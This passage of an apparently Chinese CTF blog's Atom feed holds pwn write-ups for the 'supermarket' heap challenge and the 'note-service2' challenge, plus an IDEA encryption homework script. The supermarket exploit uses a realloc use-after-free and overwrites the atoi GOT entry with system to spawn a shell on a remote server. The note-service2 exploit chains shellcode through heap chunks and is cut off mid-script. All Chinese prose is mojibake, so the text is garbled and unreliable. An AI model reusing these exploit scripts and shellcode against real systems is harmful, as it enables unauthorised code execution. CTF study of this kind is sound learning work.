        &lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h2&gt;&lt;p&gt;ä¸€ä¸ªæœ‰æ„æ€çš„æº¢å‡ºé¢˜ï¼Œå…³é”®åœ¨äºå¦‚ä½•è·³å‡ºå¾ªç¯ROPï¼Œæ˜¯æˆ‘æ²¡è§è¿‡çš„èˆ¹æ–°ç‰ˆæœ¬ï¼Œå‘œå‘œå‘œã€‚&lt;/p&gt;
&lt;h2 id=&quot;å‰ç½®çŸ¥è¯†&quot;&gt;&lt;a href=&quot;#å‰ç½®
      
    
    </summary>
    
    
    
      <category term="Pwn" scheme="https://www.sketchplane.top/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>æ”»é˜²ä¸–ç•Œ-supermarket</title>
    <link href="https://www.sketchplane.top/2020/11/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-supermarket/"/>
    <id>https://www.sketchplane.top/2020/11/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-supermarket/</id>
    <published>2020-11-13T06:48:01.000Z</published>
    <updated>2020-11-13T08:08:50.530Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p> æ”»é˜²ä¸–ç•Œçš„ä¸€é“å †é¢˜ï¼Œè€ƒå¯Ÿreallocä¸å½“å¯¼è‡´çš„uaf~</p><h2 id="å‰ç½®çŸ¥è¯†"><a href="#å‰ç½®çŸ¥è¯†" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h2><h3 id="reallocå‡½æ•°"><a href="#reallocå‡½æ•°" class="headerlink" title="reallocå‡½æ•°"></a>reallocå‡½æ•°</h3><p>1ï¼‰å¦‚æœå½“å‰å†…å­˜æ®µåé¢æœ‰éœ€è¦çš„å†…å­˜ç©ºé—´ï¼Œåˆ™ç›´æ¥æ‰©å±•è¿™æ®µå†…å­˜ç©ºé—´ï¼Œrealloc()å°†è¿”å›åŸæŒ‡é’ˆã€‚<br><strong>2ï¼‰å¦‚æœå½“å‰å†…å­˜æ®µåé¢çš„ç©ºé—²å­—èŠ‚ä¸å¤Ÿï¼Œé‚£ä¹ˆå°±ä»binsä¸­åˆ†é…ä¸€ä¸ªæ»¡è¶³éœ€æ±‚çš„å†…å­˜å—ï¼Œå°†ç›®å‰çš„æ•°æ®å¤åˆ¶åˆ°æ–°çš„ä½ç½®ï¼Œå¹¶å°†åŸæ¥çš„æ•°æ®å—é‡Šæ”¾æ‰ï¼Œè¿”å›æ–°çš„å†…å­˜å—ä½ç½®ã€‚</strong><br>3ï¼‰å¦‚æœç”³è¯·å¤±è´¥ï¼Œå°†è¿”å›NULLï¼Œæ­¤æ—¶ï¼ŒåŸæ¥çš„æŒ‡é’ˆä»ç„¶æœ‰æ•ˆã€‚</p><h2 id="é¢˜ç›®ä¿¡æ¯"><a href="#é¢˜ç›®ä¿¡æ¯" class="headerlink" title="é¢˜ç›®ä¿¡æ¯"></a>é¢˜ç›®ä¿¡æ¯</h2><ul><li>èœå•é¢˜ï¼Œ32ä½ï¼Œæ²¡PIEæ²¡canaryï¼Œæ ˆä¸å¯æ‰§è¡Œ</li><li>å­˜åœ¨ä¸€ä¸ªé•¿åº¦ä¸º0x10çš„(&amp;s2)æ•°ç»„ï¼Œæ˜¯ä¸€ä¸ªç»“æ„ä½“æŒ‡é’ˆæ•°ç»„</li><li>chg_des()å­˜åœ¨reallocå‡½æ•°ï¼Œå¹¶ä¸”æ²¡æœ‰ç»™è¿”å›æŒ‡é’ˆèµ‹å€¼</li><li>ç»“æ„ä½“çš„è¯¦ç»†å†…å®¹ä¼šç”¨åˆ°ï¼Œè§ä¸‹å›¾ï¼š</li></ul><p><img src="https://t1.picb.cc/uploads/2020/11/13/ZydFYe.png" alt=""></p><p><strong>æ³¨æ„ï¼š</strong>è¿™é‡Œçš„(&amp;s2)[i]è¿™ç§å†™æ³•ï¼Œæ˜¯ä¸€ä¸ªç»“æ„ä½“æŒ‡é’ˆæ•°ç»„ï¼Œæš‚æ—¶ä¸ç¡®å®šæ˜¯å¦è¿™ç§å†™æ³•éƒ½æ˜¯ç»“æ„ä½“ã€‚</p><h2 id="åˆ©ç”¨æ€è·¯"><a href="#åˆ©ç”¨æ€è·¯" class="headerlink" title="åˆ©ç”¨æ€è·¯"></a>åˆ©ç”¨æ€è·¯</h2><ul><li>åˆ›å»ºä¸¤ä¸ªnodeï¼Œç¬¬0ä¸ªå¤§å°å¤§äºfastbinï¼ˆ0x80ï¼‰ï¼Œç¬¬1ä¸ªéšæ„</li><li>realloc()ç¬¬0ä¸ªnodeçš„desï¼Œä½¿å…¶freeæ‰ï¼Œç„¶åç”³è¯·ç¬¬2ä¸ªnodeï¼Œæ­¤æ—¶<code>node0-&gt;des_ptr = node2</code></li><li>ä¿®æ”¹node0-&gt;des_ptrï¼Œå³ä¿®æ”¹node2ï¼Œuafæˆç«‹</li><li>é€šè¿‡uafä½¿å¾—des_ptræŒ‡å‘atoi_gotåœ°å€</li><li>ä½¿ç”¨liståŠŸèƒ½æ³„éœ²atoi()åŠ è½½åœ°å€ï¼Œä½¿ç”¨LibcSearcheræ±‚å‡ºsystem()çœŸå®åœ°å€</li><li>ä½¿ç”¨chg_desåŠŸèƒ½ä¿®æ”¹atoi_gotåœ°å€çš„å†…å®¹ä¸ºsystem()çœŸå®åœ°å€ï¼Œå‘é€<code>/bin/sh</code>è§¦å‘æ¼æ´</li></ul><p><strong>æ³¨æ„ï¼š</strong>é¦–å…ˆï¼Œå› ä¸ºrealloc()çš„ç‰¹ç‚¹ï¼Œéœ€è¦ä¸€ä¸ªnodeåšé—´éš”æ¥é˜²æ­¢åˆå¹¶ï¼›å…¶æ¬¡ç¬¬ä¸€ä¸ªå—å¤§å°è¦å¤§äº0x80ï¼Œå…·ä½“ä¸ºä»€ä¹ˆå¿˜è®°äº†ï¼Œä¹‹åå†çœ‹çœ‹ä¹¦= =</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.update(arch='i386', log_level='debug')</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">'./supermarket'</span>)</span><br><span class="line">io = remote(<span class="string">'220.249.52.133'</span>, <span class="number">42645</span>)</span><br><span class="line">elf = ELF(<span class="string">'./supermarket'</span>)</span><br><span class="line">atoi_got = elf.got[<span class="string">'atoi'</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(name, size, des)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">'your choice&gt;&gt;'</span>, <span class="string">'1'</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">'name:'</span>, str(name))</span><br><span class="line">    io.sendlineafter(<span class="string">'price:'</span>, <span class="string">'10'</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">'crip_size:'</span>, str(size))</span><br><span class="line">    io.sendlineafter(<span class="string">'cription'</span>, des)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">'your choice&gt;&gt;'</span>, <span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">chg_des</span><span class="params">(name, size, des)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">'your choice&gt;&gt;'</span>, <span class="string">'5'</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">'name:'</span>, str(name))</span><br><span class="line">    io.sendlineafter(<span class="string">'crip_size:'</span>, str(size))</span><br><span class="line">    io.sendlineafter(<span class="string">'cription'</span>, des)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x80</span>, <span class="string">'a'</span>*<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x20</span>, <span class="string">'b'</span>*<span class="number">0x10</span>)</span><br><span class="line">chg_des(<span class="number">0</span>, <span class="number">0x90</span>, <span class="string">''</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x20</span>, <span class="string">'c'</span>*<span class="number">0x10</span>)</span><br><span class="line">payload = <span class="string">b'2'</span>.ljust(<span class="number">16</span>, <span class="string">b'\x00'</span>)+p32(<span class="number">20</span>)+p32(<span class="number">0x20</span>)+p32(atoi_got)</span><br><span class="line">chg_des(<span class="number">0</span>, <span class="number">0x80</span>, payload)</span><br><span class="line">show()</span><br><span class="line">io.recvuntil(<span class="string">'2: price.20, des.'</span>)</span><br><span class="line">atoi_addr = u32(io.recvuntil(<span class="string">'\n'</span>, <span class="literal">True</span>).ljust(<span class="number">4</span>, <span class="string">b'\x00'</span>)) <span class="comment"># not necessary</span></span><br><span class="line"><span class="comment">#print(atoi_addr)</span></span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">'atoi'</span>, atoi_addr)</span><br><span class="line">libc_base = atoi_addr - libc.dump(<span class="string">'atoi'</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span class="line"></span><br><span class="line">chg_des(<span class="number">2</span>, <span class="number">0x20</span>, p32(system_addr))</span><br><span class="line">io.sendlineafter(<span class="string">'&gt;&gt;'</span>, <span class="string">'/bin/sh'</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><strong>æ³¨æ„ï¼š</strong>è¿™é‡Œæœ¬åœ°è°ƒè¯•æœ‰é—®é¢˜ï¼Œç›´æ¥è¿œç¨‹è°ƒã€‚</p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>è¿™é¢˜è€ƒå¯Ÿçš„æ˜¯realloc()å¯¼è‡´çš„uafï¼Œä»¥åŠå¦‚ä½•åˆ©ç”¨uafæ¥getshellï¼Œatoi()å‡½æ•°éœ€è¦ç‰¹åˆ«æ³¨æ„ï¼Œä¸æ˜¯ç¬¬ä¸€æ¬¡é‡è§æ”¹å®ƒçš„gotè¡¨äº†ã€‚</p><p>ä¸‹æ¬¡ç¢°åˆ°(&amp;s2)[i]ã€(%s2)[i] + jï¼Œå¯ä»¥æƒ³æƒ³æ˜¯ä¸æ˜¯ç»“æ„ä½“ã€‚</p><p>å¤šåˆ·é¢˜ï¼Œå¤šæ€»ç»“ï¼</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h2&gt;&lt;p&gt; æ”»é˜²ä¸–ç•Œçš„ä¸€é“å †é¢˜ï¼Œè€ƒå¯Ÿreallocä¸å½“å¯¼è‡´çš„uaf~&lt;/p&gt;
&lt;h2 id=&quot;å‰ç½®çŸ¥è¯†&quot;&gt;&lt;a href=&quot;#å‰ç½®çŸ¥è¯†&quot; class=
      
    
    </summary>
    
    
    
      <category term="Pwn" scheme="https://www.sketchplane.top/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>IDEAåŠ å¯†ç®—æ³•</title>
    <link href="https://www.sketchplane.top/2020/10/25/IDEA%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/"/>
    <id>https://www.sketchplane.top/2020/10/25/IDEA%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/</id>
    <published>2020-10-25T10:10:03.000Z</published>
    <updated>2020-10-27T13:21:46.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>è§‰å¾—æ‰‹ç®—ä¸€è½®è¿™ä¸ªIDEAåŠ å¯†å¤ªä¸ä¼˜é›…ï¼Œå°±ç”¨pythonè§£æ”¾ä¸‹åŒæ‰‹äº†= =</p><h2 id="è„šæœ¬"><a href="#è„šæœ¬" class="headerlink" title="è„šæœ¬"></a>è„šæœ¬</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -- coding: utf-8 --</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mod_65536_plus</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> (a + b) % <span class="number">65536</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mod_65537_mult</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> (a * b) % <span class="number">65537</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">left_25</span><span class="params">(lst)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> lst[<span class="number">25</span>:] + lst[:<span class="number">25</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s = <span class="string">"00000000111111110000000011111111111111110000111111110000111111110000111111110000111111110000000000001111111111111111000000001111"</span></span><br><span class="line">s1 = left_25(s)</span><br><span class="line"><span class="comment"># s1 = 1111111111111110 0001111111100001 1111111000011111 1110000111111110 0000000000011111 1111111111100000 0001111000000001 1111111000000001</span></span><br><span class="line"><span class="comment"># ä¾‹é¢˜M = [0, 0b1010101011100110, 0b0101010100001111, 0b1100110000110011, 0b1001100101100110]</span></span><br><span class="line">M = [<span class="number">4</span>,</span><br><span class="line">     <span class="number">0b0110010000011111</span>,</span><br><span class="line">     <span class="number">0b1001010100101101</span>,</span><br><span class="line">     <span class="number">0b0000101001000010</span>,</span><br><span class="line">     <span class="number">0b1000000001111111</span>]</span><br><span class="line">K0 = [<span class="number">8</span>,</span><br><span class="line">      <span class="number">0b0000000011111111</span>,</span><br><span class="line">      <span class="number">0b0000000011111111</span>,</span><br><span class="line">      <span class="number">0b1111111100001111</span>,</span><br><span class="line">      <span class="number">0b1111000011111111</span>,</span><br><span class="line">      <span class="number">0b0000111111110000</span>,</span><br><span class="line">      <span class="number">0b1111111100000000</span>,</span><br><span class="line">      <span class="number">0b0000111111111111</span>,</span><br><span class="line">      <span class="number">0b1111000000001111</span>]</span><br><span class="line">K1 = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">    K1.append(int(s1[<span class="number">16</span>*i:<span class="number">16</span>*(i+<span class="number">1</span>)], <span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">r1 = mod_65537_mult(M[<span class="number">1</span>], K0[<span class="number">7</span>])</span><br><span class="line">r2 = mod_65536_plus(M[<span class="number">2</span>], K0[<span class="number">8</span>])</span><br><span class="line">r3 = mod_65536_plus(M[<span class="number">3</span>], K1[<span class="number">1</span>])</span><br><span class="line">r4 = mod_65537_mult(M[<span class="number">4</span>], K1[<span class="number">2</span>])</span><br><span class="line">r5 = r1 ^ r3</span><br><span class="line">r6 = r2 ^ r4</span><br><span class="line">r7 = mod_65537_mult(r5, K1[<span class="number">3</span>])</span><br><span class="line">r8 = mod_65536_plus(r7, r6)</span><br><span class="line">r9 = mod_65537_mult(r8, K1[<span class="number">4</span>])</span><br><span class="line">r10 = mod_65536_plus(r7, r9)</span><br><span class="line">r11 = r1 ^ r9</span><br><span class="line">r12 = r2 ^ r10</span><br><span class="line">r13 = r3 ^ r9</span><br><span class="line">r14 = r4 ^ r10</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(bin(r1)[<span class="number">2</span>:].rjust(<span class="number">16</span>, <span class="string">'0'</span>))</span><br><span class="line">print(bin(r2)[<span class="number">2</span>:].rjust(<span class="number">16</span>, <span class="string">'0'</span>))</span><br><span class="line">print(bin(r3)[<span class="number">2</span>:].rjust(<span class="number">16</span>, <span class="string">'0'</span>))</span><br><span class="line">print(bin(r4)[<span class="number">2</span>:].rjust(<span class="number">16</span>, <span class="string">'0'</span>))</span><br><span class="line">print(bin(r5)[<span class="number">2</span>:].rjust(<span class="number">16</span>, <span class="string">'0'</span>))</span><br><span class="line">print(bin(r6)[<span class="number">2</span>:].rjust(<span class="number">16</span>, <span class="string">'0'</span>))</span><br><span class="line">print(bin(r7)[<span class="number">2</span>:].rjust(<span class="number">16</span>, <span class="string">'0'</span>))</span><br><span class="line">print(bin(r8)[<span class="number">2</span>:].rjust(<span class="number">16</span>, <span class="string">'0'</span>))</span><br><span class="line">print(bin(r9)[<span class="number">2</span>:].rjust(<span class="number">16</span>, <span class="string">'0'</span>))</span><br><span class="line"></span><br><span class="line">output = [bin(r11)[<span class="number">2</span>:].rjust(<span class="number">16</span>, <span class="string">'0'</span>),</span><br><span class="line">          bin(r13)[<span class="number">2</span>:].rjust(<span class="number">16</span>, <span class="string">'0'</span>),</span><br><span class="line">          bin(r12)[<span class="number">2</span>:].rjust(<span class="number">16</span>, <span class="string">'0'</span>),</span><br><span class="line">          bin(r14)[<span class="number">2</span>:].rjust(<span class="number">16</span>, <span class="string">'0'</span>)]</span><br><span class="line">print(output)</span><br></pre></td></tr></table></figure><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>æ—¶é—´ä¸æ˜¯å¾ˆå……è£•ï¼Œå¤§æ¦‚å°±æ˜¯å®ç°ä¸€ä¸ªè½®ç»“æ„ï¼Œä¸»è¦æ˜¯äº¤ä½œä¸šç”¨ã€‚</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h2&gt;&lt;p&gt;è§‰å¾—æ‰‹ç®—ä¸€è½®è¿™ä¸ªIDEAåŠ å¯†å¤ªä¸ä¼˜é›…ï¼Œå°±ç”¨pythonè§£æ”¾ä¸‹åŒæ‰‹äº†= =&lt;/p&gt;
&lt;h2 id=&quot;è„šæœ¬&quot;&gt;&lt;a href=&quot;#è„šæœ¬&quot; cla
      
    
    </summary>
    
    
    
      <category term="Crypto" scheme="https://www.sketchplane.top/tags/Crypto/"/>
    
  </entry>
  
  <entry>
    <title>æ”»é˜²ä¸–ç•Œ-note-service2</title>
    <link href="https://www.sketchplane.top/2020/10/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-note-service2/"/>
    <id>https://www.sketchplane.top/2020/10/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-note-service2/</id>
    <published>2020-10-08T15:15:36.000Z</published>
    <updated>2020-10-08T15:20:08.896Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>åšåˆ°çš„ç¬¬ä¸€ä¸ªå †é¢˜ï¼Œå¯¹æˆ‘æ¥è¯´è¿˜æ˜¯æœ‰ä¸¶éš¾åº¦ï¼Œé‚è®°å½•ä¸€ä¸‹ã€‚</p><h2 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h2><p>é¦–å…ˆchecksecä¸€ä¸‹ï¼š</p><p><img src="https://i.loli.net/2020/10/08/huyNLRGxwdtjn4p.png" alt="checksec"></p><p>å †æ ˆæ•°æ®å¯æ‰§è¡Œï¼Œä¸”å­˜åœ¨å¯å†™å…¥çš„æ®µï¼Œæ ¹æ®æˆ‘çš„ç»éªŒæ¥è¯´è¿™ç§æƒ…å†µä¸€èˆ¬æ˜¯èµ°ret2shellcodeã€‚</p><p>ç„¶åIDAåæ±‡ç¼–çœ‹ä¸€ä¸‹ç¨‹åºé€»è¾‘ï¼Œè¿™é‡Œç›´æ¥çœ‹æ¼æ´ç‚¹ï¼š</p><p><img src="https://i.loli.net/2020/10/08/TtUA5MKvbaImLke.png" alt="ida_code"></p><p>è¿™é‡Œç”±äºæ•°ç»„ç´¢å¼•å­˜åœ¨è¶Šç•Œï¼Œæ‰€ä»¥æˆ‘ä»¬é€šè¿‡ä¿®æ”¹ç´¢å¼•ï¼Œå¯ä»¥å®ç°ä»»æ„åœ°å€å†™ã€‚</p><h2 id="è§£é¢˜æ€è·¯"><a href="#è§£é¢˜æ€è·¯" class="headerlink" title="è§£é¢˜æ€è·¯"></a>è§£é¢˜æ€è·¯</h2><p>æ—¢ç„¶æˆ‘ä»¬å¯ä»¥åœ¨å †å†…å†™å…¥å†…å®¹ï¼Œè¿™é‡Œå°±è€ƒè™‘åœ¨åˆ†é…çš„å †å—ä¸­å†™å…¥shellcodeï¼Œä½†æ˜¯ç”±äºæ¯ä¸ªå †å—æœ€å¤šåªèƒ½å†™å…¥7å­—èŠ‚ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿™é‡Œå°†shellcodeåˆ†å¼€å†™å…¥å¤šä¸ªå †å—ä¸­ï¼Œå†ä½¿ç”¨ <code>jmp short xxx</code> æ¥è·³è½¬ã€‚</p><p>æ¥ä¸‹æ¥çš„é—®é¢˜æ˜¯è¿™ä¸ªxxxæ˜¯å¤šå°‘ï¼Œè¿™ä¸ªæ˜¯æœ‰å…¬å¼çš„ï¼š</p><p><code>xxx = ç›®æ ‡åœ°å€ - å½“å‰åœ°å€ - å‘½ä»¤é•¿åº¦</code></p><p><img src="https://i.loli.net/2020/10/08/8LODpFj9dbX3REk.png" alt="chunk_offset"></p><p>é‚£ä¹ˆæ ¹æ®å…¬å¼è®¡ç®—ï¼šxxx = 2+1+8+8+8 - 2 = 0x19</p><p>è·³è½¬çš„é—®é¢˜è§£å†³äº†ï¼Œæ¥ä¸‹æ¥å¯ä»¥å¼€å§‹æ„é€ shellcodeé“¾</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov rdi, xxx   ;xxx&#x3D;&amp;(&quot;&#x2F;bin&#x2F;sh&quot;)  </span><br><span class="line">xor rsi,rsi    ;rsi&#x3D;0ï¼Œä¸ç”¨ mov xxx,0 æ˜¯å› ä¸ºè¶…è¿‡é•¿åº¦äº†</span><br><span class="line">mov rax, 0x3b  ;rax&#x3D;0x3b å 4å­—èŠ‚</span><br><span class="line">xor rdx,rdx    ;rdx&#x3D;0 å 2å­—èŠ‚</span><br><span class="line">syscall  ;å 2å­—èŠ‚</span><br></pre></td></tr></table></figure><p><strong>ps:</strong> ä½¿ç”¨<code>enhex(asm(&#39;xor rsi, rsi&#39;))</code>å¯ä»¥æŸ¥çœ‹æ±‡ç¼–ä»£ç å¯¹åº”æœºå™¨ç çš„åå…­è¿›åˆ¶é•¿åº¦ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">asm(<span class="string">"xor rsi,rsi"</span>)+<span class="string">"\x90\x90\xeb\x19"</span></span><br><span class="line">asm(<span class="string">"mov rax,0x3b"</span>)+<span class="string">"\xeb\x19"</span></span><br><span class="line">asm(<span class="string">"xor rdx,rdx"</span>)+<span class="string">"\x90\x90\xeb\x19"</span></span><br><span class="line">asm(<span class="string">"syscall"</span>).ljust(<span class="number">7</span>,<span class="string">"\x90"</span>)</span><br></pre></td></tr></table></figure><p>åé¢çš„è¯­å¥éƒ½å¥½å†™ï¼Œä½†æ˜¯ç¬¬ä¸€æ¡ç»™rdiä¼ å‚æ— è®ºæ€ä¹ˆå†™éƒ½ä¼šè¶…é•¿ï¼Œè¿™é‡Œéœ€è¦å¦è°‹ä»–æ³•ï¼š</p><ol><li>ç”³è¯·ä¸€ä¸ªå †å—Aï¼Œå¡«å…¥å†…å®¹ä¸º<code>/bin/sh</code></li><li>ä¿®æ”¹freeå‡½æ•°gotè¡¨å†…å®¹ï¼Œä½¿å…¶è¢«è°ƒç”¨åè·³è½¬åˆ°ä¸‹ä¸€ä¸ªå †å—</li><li>è°ƒç”¨free(A)ï¼Œæ ¹æ®ä¼ å‚è§„åˆ™ï¼Œæ­¤æ—¶rdié‡Œå°±ä¼šæ˜¯<code>/bin/sh</code>çš„åœ°å€ï¼Œå¹¶ä¸”å¯åŠ¨æ•´ä¸ªå †å—é“¾</li></ol><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">'./note-service2'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./note-service2'</span>)</span><br><span class="line">context.update(arch =<span class="string">'amd64'</span>)</span><br><span class="line"></span><br><span class="line">heap_addr = <span class="number">0x2020a0</span></span><br><span class="line">free_got = elf.got[<span class="string">'free'</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(index, content)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">'your choice&gt;&gt;'</span>, <span class="string">"1"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">'index:'</span>, str(index))</span><br><span class="line">    io.sendlineafter(<span class="string">'size:'</span>, <span class="string">"8"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">'content:'</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">(index)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">'your choice&gt;&gt;'</span>, <span class="string">"4"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">'index:'</span>, str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="string">'/bin/sh'</span>)</span><br><span class="line">add((free_got-heap_addr)/<span class="number">8</span>, asm(<span class="string">'xor rsi, rsi'</span>)+<span class="string">b"\x90\x90\xeb\x19"</span>)</span><br><span class="line">add(<span class="number">1</span>, asm(<span class="string">'mov eax, 0x3b'</span>)+<span 